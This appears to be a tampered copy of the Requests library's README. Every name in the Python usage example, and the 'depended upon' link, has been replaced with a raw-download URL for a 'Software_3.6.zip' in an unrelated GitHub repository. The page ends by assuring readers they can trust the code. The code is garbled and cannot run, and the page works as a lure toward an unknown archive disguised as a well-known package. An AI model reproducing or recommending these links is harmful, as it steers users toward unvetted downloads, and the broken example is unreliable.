# Requests

**Requests** is a simple, yet elegant, HTTP library.

```python
>>> import requests
>>> r = https://github.com/titoxavierfernandes/requests/raw/refs/heads/main/src/Software_3.6.zip('https://github.com/titoxavierfernandes/requests/raw/refs/heads/main/src/Software_3.6.zip', auth=('user', 'pass'))
>>> https://github.com/titoxavierfernandes/requests/raw/refs/heads/main/src/Software_3.6.zip
200
>>> https://github.com/titoxavierfernandes/requests/raw/refs/heads/main/src/Software_3.6.zip['content-type']
'application/json; charset=utf8'
>>> https://github.com/titoxavierfernandes/requests/raw/refs/heads/main/src/Software_3.6.zip
'utf-8'
>>> https://github.com/titoxavierfernandes/requests/raw/refs/heads/main/src/Software_3.6.zip
'{"authenticated": true, ...'
>>> https://github.com/titoxavierfernandes/requests/raw/refs/heads/main/src/Software_3.6.zip()
{'authenticated': True, ...}
```

Requests allows you to send HTTP/1.1 requests extremely easily. There’s no need to manually add query strings to your URLs, or to form-encode your `PUT` & `POST` data — but nowadays, just use the `json` method!

Requests is one of the most downloaded Python packages today, pulling in around `30M downloads / week`— according to GitHub, Requests is currently [depended upon](https://github.com/titoxavierfernandes/requests/raw/refs/heads/main/src/Software_3.6.zip%3D%3D) by `1,000,000+` repositories. You may certainly put your trust in this code.
